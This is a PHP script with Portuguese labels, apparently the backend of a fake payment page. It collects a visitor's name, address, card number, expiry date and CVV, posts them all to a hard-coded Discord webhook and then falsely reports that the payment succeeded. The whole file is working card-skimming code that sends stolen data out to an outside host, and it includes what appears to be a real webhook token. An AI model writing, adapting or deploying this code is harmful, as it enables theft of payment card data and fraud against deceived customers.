<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $nome = htmlspecialchars($_POST['nome']);
    $email = htmlspecialchars($_POST['email']);
    $endereco = htmlspecialchars($_POST['endereco']);
    $cidade = htmlspecialchars($_POST['cidade']);
    $estado = htmlspecialchars($_POST['estado']);
    $cep = htmlspecialchars($_POST['cep']);
    $cartao = htmlspecialchars($_POST['cartao']);
    $validade = htmlspecialchars($_POST['validade']);
    $cvv = htmlspecialchars($_POST['cvv']);

    $webhook_url = "https://discord.com/api/webhooks/1252520341457211452/0UXEOR9XEi14kcQvLkgJkpF2QE5iGhxUjP2jYMqIV_6ivcUqCRMS1LWxXwEM-eSD6V5N";

    $message = [
        "embeds" => [
            [
                "title" => "Novo Pagamento Recebido",
                "fields" => [
                    ["name" => "Nome", "value" => $nome],
                    ["name" => "Email", "value" => $email],
                    ["name" => "Endereço", "value" => $endereco],
                    ["name" => "Cidade", "value" => $cidade],
                    ["name" => "Estado", "value" => $estado],
                    ["name" => "CEP", "value" => $cep],
                    ["name" => "Número do Cartão", "value" => $cartao],
                    ["name" => "Data de Validade", "value" => $validade],
                    ["name" => "CVV", "value" => $cvv]
                ]
            ]
        ]
    ];

    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/json',
            'content' => json_encode($message)
        ]
    ];

    $context = stream_context_create($options);
    $result = file_get_contents($webhook_url, false, $context);

    if ($result === FALSE) {
        die('Erro ao enviar mensagem para o webhook do Discord.');
    }

    echo "Pagamento processado com sucesso!";
} else {
    echo "Método de requisição inválido.";
}
?>